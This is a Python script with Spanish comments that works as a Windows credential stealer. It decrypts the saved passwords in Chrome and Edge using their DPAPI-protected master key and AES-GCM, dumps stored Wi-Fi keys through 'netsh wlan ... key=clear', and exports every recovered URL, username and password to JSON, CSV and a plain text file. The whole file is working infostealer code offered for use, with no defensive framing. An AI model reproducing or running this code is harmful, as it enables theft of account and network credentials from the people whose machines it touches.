import os
import re
import json
import base64
import sqlite3
import shutil
import csv
import subprocess
from Cryptodome.Cipher import AES
import win32crypt
from pathlib import Path
from datetime import datetime
from collections import defaultdict

# ============================================================
# VARIABLE GLOBAL PARA ALMACENAR TODO
# ============================================================
extracted_data = {
    "browsers": {
        "chrome": [],
        "edge": []
    },
    "wifi_networks": [],
    "metadata": {
        "extraction_date": None,
        "total_passwords": 0,
        "total_wifi": 0
    }
}

# ============================================================
# OBTENER LLAVE MAESTRA
# ============================================================
def get_secret_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix

        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    except Exception as e:
        print(f"[ERROR] Failed to retrieve secret key: {e}")
        return None

# ============================================================
# DESENCRIPTAR CONTRASEÑA
# ============================================================
def decrypt_password(ciphertext, secret_key):
    try:
        if not ciphertext or len(ciphertext) < 4:
            return None

        if ciphertext.startswith(b"v10") or ciphertext.startswith(b"v11"):
            iv = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            tag = ciphertext[-16:]

            cipher = AES.new(secret_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt_and_verify(encrypted_password, tag)
            return decrypted_pass.decode("utf-8")

        # DPAPI fallback
        if len(ciphertext) > 16:
            decrypted = win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1]
            return decrypted.decode("utf-8")

        return None

    except:
        return None

# ============================================================
# RAZONES POR LAS QUE EL NAVEGADOR NO GUARDA CONTRASEÑAS
# ============================================================
def analyze_no_password(url):
    block_list = [
        "google.com",
        "microsoftonline.com",
        "office.com",
        "instagram.com",
        "facebook.com",
        "mega.nz",
        "epicgames.com",
        "battle.net",
    ]

    causes = []

    if any(domain in url for domain in block_list):
        causes.append("Sitio NO permite guardar contraseñas.")

    if "register" in url:
        causes.append("Formularios de registro no guardan contraseña.")

    return causes if causes else ["Chrome/Edge no generó un registro local."]

# ============================================================
# COPIA TEMPORAL DEL LOGIN DATA
# ============================================================
def get_db_connection(path):
    try:
        temp = Path("Loginvault.db")
        shutil.copy2(path, temp)
        return sqlite3.connect(temp)
    except Exception as e:
        print(f"[ERROR] Cannot access DB: {e}")
        return None

# ============================================================
# PROCESAR NAVEGADOR COMPLETO (Chrome o Edge)
# ============================================================
def process_browser(name, user_data_path, browser_key):
    print(f"\n{'='*50}")
    print(f"  EXTRAYENDO: {name}")
    print(f"{'='*50}\n")

    local_state = user_data_path / "Local State"
    if not local_state.exists():
        print("[-] Local State no existe.")
        return 0

    secret_key = get_secret_key(local_state)
    if not secret_key:
        print("[-] No se pudo extraer la master key.")
        return 0

    profiles = [p for p in user_data_path.iterdir() if p.is_dir() and re.match(r"^Profile|Default$", p.name)]
    
    total_extracted = 0

    for profile in profiles:
        db = profile / "Login Data"
        if not db.exists():
            continue

        conn = get_db_connection(db)
        if not conn:
            continue

        try:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT 
                    origin_url, 
                    username_value, 
                    password_value,
                    date_created,
                    times_used,
                    date_last_used
                FROM logins 
                ORDER BY date_last_used DESC
            """)

            for entry in cursor.fetchall():
                url, user, cipher, date_created, times_used, date_last_used = entry

                if not url or not user:
                    continue

                decrypted = decrypt_password(cipher, secret_key)
                
                # Crear estructura de datos
                password_entry = {
                    "url": url,
                    "username": user,
                    "encrypted": cipher is not None,
                    "profile": profile.name,
                    "times_used": times_used if times_used else 0,
                    "date_created": convert_chrome_time(date_created) if date_created else None,
                    "date_last_used": convert_chrome_time(date_last_used) if date_last_used else None
                }

                if decrypted:
                    password_entry["password"] = decrypted
                    password_entry["status"] = "decrypted"
                    extracted_data["metadata"]["total_passwords"] += 1
                    total_extracted += 1
                    
                    # Imprimir en pantalla
                    print(f"[OK] {url}")
                    print(f"    USER: {user}")
                    print(f"    PASS: {decrypted}")
                    print(f"    Usos: {times_used if times_used else 0}")
                    print()
                else:
                    password_entry["password"] = None
                    password_entry["status"] = "not_decrypted"
                    password_entry["reasons"] = analyze_no_password(url)
                    
                    # Imprimir en pantalla
                    print(f"[NO PASS] {url}")
                    print(f"    USER: {user}")
                    for reason in password_entry["reasons"]:
                        print(f"    ➤ {reason}")
                    print()

                # Guardar en la variable global
                extracted_data["browsers"][browser_key].append(password_entry)

        except Exception as e:
            print(f"[ERROR DB] {e}")
        finally:
            cursor.close()
            conn.close()

        Path("Loginvault.db").unlink(missing_ok=True)
    
    print(f"✓ Extraídos {total_extracted} contraseñas de {name}")
    return total_extracted

# ============================================================
# CONVERTIR TIMESTAMP DE CHROME/EDGE
# ============================================================
def convert_chrome_time(chrome_time):
    """Convierte timestamp de Chrome/Edge a formato legible"""
    if chrome_time:
        # Chrome timestamp está en microsegundos desde 1601-01-01
        try:
            unix_time = chrome_time / 1000000 - 11644473600
            return datetime.fromtimestamp(unix_time).strftime('%Y-%m-%d %H:%M:%S')
        except:
            return None
    return None

# ============================================================
# WIFI PASSWORD EXTRACTOR
# ============================================================
def get_wifi_profiles():
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True).decode(errors="ignore")

        profiles = re.findall(r"Perfil de todos los usuarios\s*:\s*(.*)", output)
        if not profiles:
            profiles = re.findall(r"All User Profile\s*:\s*(.*)", output)

        return [p.strip() for p in profiles]

    except Exception as e:
        print("[ERROR] No se pudieron obtener perfiles WiFi:", e)
        return []

def get_wifi_password(profile):
    try:
        output = subprocess.check_output(
            f'netsh wlan show profile name="{profile}" key=clear',
            shell=True
        ).decode(errors="ignore")

        patterns = [
            r"Contenido de la clave\s*:\s*(.*)",
            r"Key Content\s*:\s*(.*)"
        ]

        for p in patterns:
            m = re.search(p, output)
            if m:
                return m.group(1).strip()

        return "[SIN CONTRASEÑA / RED ABIERTA]"

    except:
        return "[NO SE PUDO LEER]"

def extract_wifi_passwords():
    print(f"\n{'='*50}")
    print("      REDES WI-FI GUARDADAS")
    print(f"{'='*50}\n")

    profiles = get_wifi_profiles()
    
    for profile in profiles:
        password = get_wifi_password(profile)
        
        wifi_entry = {
            "ssid": profile,
            "password": password,
            "has_password": password not in ["[SIN CONTRASEÑA / RED ABIERTA]", "[NO SE PUDO LEER]"]
        }
        
        extracted_data["wifi_networks"].append(wifi_entry)
        extracted_data["metadata"]["total_wifi"] += 1
        
        # Imprimir en pantalla
        status = "🔒" if wifi_entry["has_password"] else "🌐"
        print(f"{status} SSID: {profile}")
        print(f"     PASS: {password}\n")
    
    return len(profiles)

# ============================================================
# FUNCIONES PARA EXPORTAR DATOS
# ============================================================
def export_to_json(filename="extracted_data.json"):
    """Exporta todos los datos a un archivo JSON"""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(extracted_data, f, ensure_ascii=False, indent=4)
        print(f"✓ Datos exportados a {filename}")
        return True
    except Exception as e:
        print(f"✗ Error exportando a JSON: {e}")
        return False

def export_to_csv(filename="extracted_data.csv"):
    """Exporta contraseñas a un archivo CSV"""
    try:
        with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(['Browser', 'URL', 'Username', 'Password', 'Profile', 'Times Used', 'Date Created'])
            
            for browser, entries in extracted_data["browsers"].items():
                for entry in entries:
                    if entry.get("password"):
                        writer.writerow([
                            browser,
                            entry['url'],
                            entry['username'],
                            entry['password'],
                            entry['profile'],
                            entry['times_used'],
                            entry['date_created']
                        ])
        
        print(f"✓ Contraseñas exportadas a {filename}")
        return True
    except Exception as e:
        print(f"✗ Error exportando a CSV: {e}")
        return False

def print_summary():
    """Imprime un resumen de lo extraído"""
    print(f"\n{'='*60}")
    print(" RESUMEN DE EXTRACCIÓN")
    print(f"{'='*60}")
    
    total_pass = extracted_data["metadata"]["total_passwords"]
    total_wifi = extracted_data["metadata"]["total_wifi"]
    
    print(f"📊 Contraseñas de navegadores: {total_pass}")
    for browser, entries in extracted_data["browsers"].items():
        if entries:
            decrypted = sum(1 for e in entries if e.get("password"))
            print(f"   • {browser.capitalize()}: {decrypted} desencriptadas")
    
    print(f"📶 Redes WiFi: {total_wifi}")
    print(f"📅 Fecha de extracción: {extracted_data['metadata']['extraction_date']}")
    print(f"{'='*60}")

# ============================================================
# MAIN – AUTOMÁTICO, SIN IF-USUARIO
# ============================================================
def main():
    # Configurar fecha de extracción
    extracted_data["metadata"]["extraction_date"] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    print(f"\n{'#'*60}")
    print("#" + " EXTRACCIÓN DE CREDENCIALES ".center(58) + "#")
    print(f"{'#'*60}\n")
    
    # Paths de navegadores
    chrome = Path(os.environ["USERPROFILE"]) / "AppData" / "Local" / "Google" / "Chrome" / "User Data"
    edge = Path(os.environ["USERPROFILE"]) / "AppData" / "Local" / "Microsoft" / "Edge" / "User Data"

    if chrome.exists():
        process_browser("Google Chrome", chrome, "chrome")

    if edge.exists():
        process_browser("Microsoft Edge", edge, "edge")

    # Ejecutar WiFi SIEMPRE al final
    extract_wifi_passwords()
    
    # Mostrar resumen
    print_summary()
    
    # Exportar datos
    export_to_json()
    export_to_csv()
    
    print(f"\n🎯 ¡Extracción completada! Todos los datos están en la variable 'extracted_data'")
    
    # Devolver los datos extraídos
    return extracted_data

# ============================================================
# EJEMPLOS DE USO DESPUÉS DE LA EJECUCIÓN
# ============================================================
if __name__ == "__main__":
    # Ejecutar la extracción y guardar en variable
    todos_los_datos = main()
    
    # Ahora puedes usar la variable 'todos_los_datos' como quieras:
    print("\n" + "="*60)
    print("EJEMPLOS DE QUÉ PUEDES HACER CON LOS DATOS:")
    print("="*60)
    
    # 1. Acceder a contraseñas de Chrome
    print("\n1. Contraseñas de Chrome desencriptadas:")
    for entry in todos_los_datos["browsers"]["chrome"]:
        if entry.get("password"):
            print(f"   • {entry['url']} - {entry['username']}: {entry['password']}")
    
    # 2. Ver redes WiFi
    print("\n2. Redes WiFi guardadas:")
    for wifi in todos_los_datos["wifi_networks"]:
        if wifi["has_password"]:
            print(f"   • {wifi['ssid']}: {wifi['password']}")
    
    # 3. Estadísticas
    print(f"\n3. Estadísticas:")
    print(f"   Total contraseñas: {todos_los_datos['metadata']['total_passwords']}")
    print(f"   Total redes WiFi: {todos_los_datos['metadata']['total_wifi']}")
    
    # 4. Guardar en archivo personalizado
    print("\n4. Guardando en archivos adicionales...")
    
    # Guardar solo contraseñas en un archivo de texto
    with open("passwords.txt", "w", encoding="utf-8") as f:
        f.write("CONTRASEÑAS EXTRAÍDAS\n")
        f.write("=" * 50 + "\n\n")
        
        for browser, entries in todos_los_datos["browsers"].items():
            if entries:
                f.write(f"{browser.upper()}:\n")
                for entry in entries:
                    if entry.get("password"):
                        f.write(f"URL: {entry['url']}\n")
                        f.write(f"Usuario: {entry['username']}\n")
                        f.write(f"Contraseña: {entry['password']}\n")
                        f.write("-" * 40 + "\n")
                f.write("\n")
    
    print("✓ Archivo 'passwords.txt' creado")
    
    # La variable 'todos_los_datos' ahora contiene TODO en formato estructurado
    print(f"\n✅ ¡Todo listo! La variable contiene {len(todos_los_datos['browsers']['chrome']) + len(todos_los_datos['browsers']['edge'])} entradas.")